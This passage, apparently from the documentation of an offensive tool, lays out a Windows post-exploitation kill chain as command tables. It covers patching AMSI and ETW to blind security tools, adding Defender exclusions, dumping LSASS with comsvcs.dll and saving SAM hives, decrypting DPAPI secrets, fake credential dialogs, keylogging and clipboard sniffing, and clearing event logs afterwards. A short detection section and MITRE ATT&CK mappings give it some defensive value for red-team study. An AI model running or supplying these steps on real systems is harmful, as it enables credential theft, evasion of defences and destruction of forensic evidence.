Select RealTimeProtectionEnabled  # Defender status\nGet-Process lsass                         # verify LSASS accessible\nreg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RunAsPPL  # PPL status</code></pre>","n":765},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — AV/EDR Evasion (First priority)</h4><p>Neutralize monitoring before performing credential operations.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Bypass AMSI</td><td><code>patch AmsiScanBuffer in memory (PowerShell reflection or C# inline)</code></td><td>Patch AmsiScanBuffer to allow undetected PowerShell execution</td></tr><tr><td>Blind ETW</td><td><code>patch EtwEventWrite in ntdll.dll to return early (blind EDR telemetry)</code></td><td>Patch EtwEventWrite to prevent EDR from receiving telemetry</td></tr><tr><td>Exclude paths</td><td><code>Set-MpPreference -ExclusionPath C:\\Tools</code></td><td>Add Defender exclusion for tool staging directory</td></tr></tbody></table></div><h4 class=\"mh\">Phase 2 — Credential Harvesting</h4><p>Extract credentials from multiple sources.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>LSASS dump</td><td><code>rundll32 comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full</code></td><td>Dump LSASS memory for NTLM hashes, Kerberos tickets, plaintext passwords</td></tr><tr><td>SAM extraction</td><td><code>reg save HKLM\\SAM sam.hive &amp;&amp; reg save HKLM\\SYSTEM system.hive &amp;&amp; reg save HKLM\\SECURITY security.hive</code></td><td>Extract registry hives for offline cracking with secretsdump/hashcat</td></tr><tr><td>DPAPI secrets</td><td><code>mimikatz dpapi::masterkey + dpapi::cred, or SharpDPAPI</code></td><td>Decrypt browser passwords, WiFi keys, Windows Vault credentials</td></tr><tr><td>Credential phishing</td><td><code>PowerShell CredentialPicker or Win32 CredUIPromptForCredentials</code></td><td>Spawn fake Windows credential dialog to capture user password</td></tr><tr><td>Keystroke capture</td><td><code>SetWindowsHookEx(WH_KEYBOARD_LL) keylogger with GetForegroundWindow context</code></td><td>Log keystrokes with active window context</td></tr><tr><td>Clipboard monitoring</td><td><code>Win32 AddClipboardFormatListener + GetClipboardData polling loop</code></td><td>Capture copied passwords, tokens, and sensitive data</td></tr></tbody></table></div><p><strong>LSASS dumping</strong> uses either <code>comsvcs.dll MiniDump</code> (default, uses a signed Windows DLL) or direct <code>MiniDumpWriteDump</code> from <code>dbghelp.dll</code>. The comsvcs method is preferred as it uses a Microsoft-signed binary.</p><p><strong>DPAPI decryption</strong> calls <code>CryptUnprotectData</code> from <code>crypt32.dll</code> to decrypt Chrome/Edge Login Data, WiFi passwords, and Windows Credential Vault entries. No additional tools needed — uses the current user's DPAPI master key.</p><p><strong>SAM extraction</strong> uses <code>reg save</code> to dump SAM, SYSTEM, and SECURITY hives. These can be processed offline with <code>impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</code>.</p><h4 class=\"mh\">Phase 3 — Monitoring</h4><p>Understand the target environment and detect defensive measures.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Process monitoring</td><td><code>ETW Microsoft-Windows-Kernel-Process provider trace</code></td><td>Track process creation via ETW — detect security tools, scheduled tasks</td></tr><tr><td>Network monitoring</td><td><code>ETW Microsoft-Windows-Kernel-Network provider trace</code></td><td>Track connections via ETW — identify C2 channels, internal services</td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Cleanup (MANDATORY)</h4><p>Always run cleanup before exiting a target.</p><pre class=\"code\"><code>clear Security/System/Application event logs, remove tools, clear PowerShell history, remove scheduled tasks</code></pre><p>The cleanup tool:</p><ol class=\"ml\"><li>Clears Security, System, Application, and PowerShell event logs</li><li>Removes temporary files matching operator-deployed patterns</li><li>Removes any Defender exclusions that were added</li><li>Reports on AMSI/ETW patches (require process restart to fully restore)</li></ol>","n":3242},{"t":"Detection Considerations","h":"<p>Windows post-exploitation tools are detectable by:</p><ul class=\"ml\"><li><strong>Sysmon</strong> — Event IDs 1 (process create), 10 (process access for LSASS), 13 (registry)</li><li><strong>Windows Event Log</strong> — Event ID 4688 (process creation), 4624/4625 (logon), 1102 (log cleared)</li><li><strong>EDR</strong> — LSASS access monitoring, credential prompt anomaly detection</li><li><strong>PPL (Protected Process Light)</strong> — LSASS PPL blocks direct memory dumps (check RunAsPPL registry key)</li><li><strong>Credential Guard</strong> — Isolates LSASS in virtualization-based security (blocks comsvcs/minidump)</li></ul>","n":515},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>lsass_dump</td><td>LSASS memory dump via MiniDumpWriteDump</td><td>T1003.001 — LSASS Memory</td></tr><tr><td>sam_dump</td><td>Registry hive extraction (SAM/SYSTEM/SECURITY)</td><td>T1003.002 — Security Account Manager</td></tr><tr><td>dpapi_extract</td><td>DPAPI secret decryption via CryptUnprotectData</td><td>T1555.003 — Credentials from Web Browsers</td></tr><tr><td>credential_prompt</td><td>Fake credential dialog via CredUI</td><td>T1056.002 — GUI Input Capture</td></tr><tr><td>keylog_win</td><td>Keystroke capture via SetWindowsHookEx</td><td>T1056.001 — Keylogging</td></tr><tr><td>etw_process</td><td>Process monitoring via ETW provider</td><td>T1057 — Process Discovery</td></tr><tr><td>etw_network</td><td>Network monitoring via ETW provider</td><td>T1049 — System Network Connections Discovery</td></tr><tr><td>clipboard_sniff</td><td>Clipboard monitoring via Win32 API</td><td>T1115 — Clipboard Data</td></tr><tr><td>amsi_bypass</td><td>AMSI patching in memory</td><td>T1562.001 — Disable or Modify Tools</td></tr><tr><td>etw_blind</td><td>ETW patching to blind EDR</td><td>T1562.006 — Indicator Blocking</td></tr><tr><td>defender_exclude</td><td>Windows Defender exclusion management</td><td>T1562.001 — Disable or Modify Tools</td></tr><tr><td>cleanup_win</td><td
